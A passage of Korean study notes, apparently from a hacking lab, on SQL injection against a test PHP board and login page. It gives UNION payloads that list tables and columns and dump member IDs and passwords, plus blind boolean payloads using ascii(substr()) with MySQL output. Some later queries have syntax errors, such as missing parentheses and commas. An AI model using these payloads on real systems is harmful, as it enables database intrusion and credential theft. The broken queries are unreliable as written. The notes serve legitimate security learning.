- Table -> select table_schema, table_name from information_schema.tables where table_schema='WebTest';

  [http://172.16.10.20/board/board_list.php?keyword=''Union select 1,table_schema,3,4,5,6,7,8,9,10,table_name from information_schema.tables where table_schema='WebTest' #']

'union select 1,2,3,4,table_schema,6,7,8,9,10,table_name from information_schema.tables where table_schema='WebTest' #

[만약 이걸 검색창에 넣으면 디비가 WebTest 이고 board와 member 인것만 볼 수 있다. ]



#### 컬럼 찾아보자

쿼리문 부터 생각을 해야됨

- Column -> select table_name, column_name from information from information_schema.colums where table_name='board';

  select table_name, column_name from information_schema.columns where table_name='member';

'union select 1,2,3,4,table_name,6,7,8,9,10,column_name from information_schema.columns where table_name='board' #

-> 이렇게 검색하면 board의 컬럼명이 뜬다. 

'union select 1,2,3,4,table_name,6,7,8,9,10,column_name from information_schema.columns where table_name='member' #

-> 이렇게 검색하면 member의 컬럼명이 뜬다. 



### 값을 찾아보자

- Value -> select u_id, u_pass from member

'union select 1,2,3,4,u_id,6,7,8,9,10,u_pass from member #



### Substring

```
mysql> select substring('admin',3,2);
+------------------------+
| substring('admin',3,2) |
+------------------------+
| mi                     |
+------------------------+
1 row in set (0.00 sec)


^원래는 이렇게 알아왔겠지만
1은 고정으로 쿼리문 으로 가져오기

mysql> select substring('admin',1,1);
+------------------------+
| substring('admin',1,1) |
+------------------------+
| a                      |
+------------------------+
1 row in set (0.00 sec)

mysql> select substring('admin',2,1);
+------------------------+
| substring('admin',2,1) |
+------------------------+
| d                      |
+------------------------+
1 row in set (0.00 sec)

mysql> select substring('admin',3,1);
+------------------------+
| substring('admin',3,1) |
+------------------------+
| m                      |
+------------------------+
1 row in set (0.00 sec)

mysql> select substring('admin',4,1);
+------------------------+
| substring('admin',4,1) |
+------------------------+
| i                      |
+------------------------+
1 row in set (0.00 sec)

mysql> select substring('admin',5,1);
+------------------------+
| substring('admin',5,1) |
+------------------------+
| n                      |
+------------------------+
1 row in set (0.00 sec)

```

#### 아스키 값으로 알아보기

```
mysql> select ascii(substr('admin',1,1));
+----------------------------+
| ascii(substr('admin',1,1)) |
+----------------------------+
|                         97 |
+----------------------------+
1 row in set (0.00 sec)

mysql> select ascii(substr('admin',2,1));
+----------------------------+
| ascii(substr('admin',2,1)) |
+----------------------------+
|                        100 |
+----------------------------+
1 row in set (0.00 sec)

mysql> select ascii(substr('admin',3,1));
+----------------------------+
| ascii(substr('admin',3,1)) |
+----------------------------+
|                        109 |
+----------------------------+
1 row in set (0.00 sec)

mysql> select ascii(substr('admin',4,1));
+----------------------------+
| ascii(substr('admin',4,1)) |
+----------------------------+
|                        105 |
+----------------------------+
1 row in set (0.00 sec)



mysql> select u_id from member;
+--------+
| u_id   |
+--------+
| admin  |
| easy   |
| hacker |
| tester |
+--------+
4 rows in set (0.00 sec)

mysql> select u_id from member limit 1,1; 
+------+
| u_id |
+------+
| easy |
+------+
1 row in set (0.00 sec)


```

```
mysql> select ascii(substr((select u_id from member limit 0,1),1,1));
+--------------------------------------------------------+
| ascii(substr((select u_id from member limit 0,1),1,1)) |
+--------------------------------------------------------+
|                                                     97 |
+--------------------------------------------------------+
1 row in set (0.00 sec)

mysql> select ascii(substr((select u_id from member limit 0,1),2,1));
+--------------------------------------------------------+
| ascii(substr((select u_id from member limit 0,1),2,1)) |
+--------------------------------------------------------+
|                                                    100 |
+--------------------------------------------------------+
1 row in set (0.00 sec)

비교해서 맞으면 1, 아니면 0
mysql> select ascii(substr((select u_id from member limit 0,1),1,1)) = 100;
+--------------------------------------------------------------+
| ascii(substr((select u_id from member limit 0,1),1,1)) = 100 |
+--------------------------------------------------------------+
|                                                            0 |
+--------------------------------------------------------------+
1 row in set (0.00 sec)

mysql> select ascii(substr((select u_id from member limit 0,1),1,1)) = 97;
+-------------------------------------------------------------+
| ascii(substr((select u_id from member limit 0,1),1,1)) = 97 |
+-------------------------------------------------------------+
|                                                           1 |
+-------------------------------------------------------------+
1 row in set (0.00 sec)


```





#### 아스키코드

0 -> NULL

32 -> 공백

33 ~ 47 -> 특수 문자

48 ~ 57 -> 숫자 0 ~ 9

58 ~ 64 -> 특수 문자

65 ~ 90 -> 대문자 A ~ Z

91 ~ 96 -> 특수 문자

97 ~ 122 -> 소문자 a ~ z



- DB -> select ascii(substr(select database(),1,1)) = 97; -> 글자 갯수를 먼저 구하고 값을 구해야 한다. 

글자 개수 : 문자열 마지막에 널 값이 들어가기 때문에 널 값 이전이 글자 갯수

한 글자씩 NULL (= ascii로 0) 이랑 비교

' or ascii(substr(database(),1,1)) = 0 # -> 거짓

' or ascii(substr(database(),2,1)) = 0 #

' or ascii(substr(database(),3,1)) = 0 # 

아 이거 하기전에  root@Linux-04 member]# vim member_login.php 여기 들어가서 user_id의 maxlength="200" 으로 늘려주기

```
ID : ' or ascii(substr(database(),1,1)) = 0 #  -> 로그인 실패 = 거짓
PW는 아무것도 안쳐도 됨


' or ascii(substr(database(),2,1)) = 0 #  -> 로그인 실패 = 거짓
' or ascii(substr(database(),3,1)) = 0 #  -> 로그인 실패 = 거짓
.
.
.
' or ascii(substr(database(),8,1)) = 0 #  -> 로그인 성공 = 참
= 8번째가 NULL 이다. 즉 글자수가 7글자라는 뜻이다. 

-----------------------------------------------------------

첫 번째 글자를 알아보자

' or ascii(substr(database(),1,1)) >= 48 # -> 참 일 경우 숫자 이상
' or ascii(substr(database(),1,1)) >= 65 # -> 참 일 경우 대문자 이상
' or ascii(substr(database(),1,1)) >= 97 # -> 거짓 일 경우 소문자 아님
' or ascii(substr(database(),1,1)) >= 90 # -> 거짓 일 경우 대문자 (65 ~ 90 = A ~ Z)
' or ascii(substr(database(),1,1)) >= 79 # -> 참 일 경우 80 ~ 90, P ~ Z
' or ascii(substr(database(),1,1)) >= 85 # -> 참 일 경우 86 ~ 90, V ~ Z
' or ascii(substr(database(),1,1)) >= 88 # -> 거짓 일 경우 86,87
' or ascii(substr(database(),1,1)) >= 87 # -> 참 일 경우 87 W

------------------------------------------------------------

두 번째 글자를 알아보자

' or ascii(substr(database(),2,1)) >= 48 # ->

.
.
.
 똑같이 반복 한다...
 
 -------------------------------------------------------------

```

#### 디비 테이블 명, 컬럼명, value 값 찾기

```
 WebTest DB
 
 테이블 명 구하기
 
Table -> select ascii(substr(select table_name from information_schema.tables where table_schema='WebTest' limit0,1),1,1)) = 0;


첫 번째의 행의 글자 수 구하기

' or ascii(substr(select table_name from information_schema.tables where table_schema='WebTest' limit0,1),1,1)) = 0 #


---------------------------------------------------------------

컬럼 명 구하기

Column -> select ascii(substr(select column_name from information_schema.columns where table_name='board' limit0,1),1,1)) = 0;

' or ascii(substr(select column_name from information_schema.columns where table_name='board' limit0,1),1,1)) = 0 #

' or ascii(substr(select column_name from information_schema.columns where table_name='member' limit0,1),1,1)) = 0 #

---------------------------------------------------------------

Value 값 구하기

Value -> select ascii(substr((select u_id from member limit 0,1)1,1)) = 0;

' or ascii(substr((select u_id from member limit 0,1)1,1)) = 0 #

```

























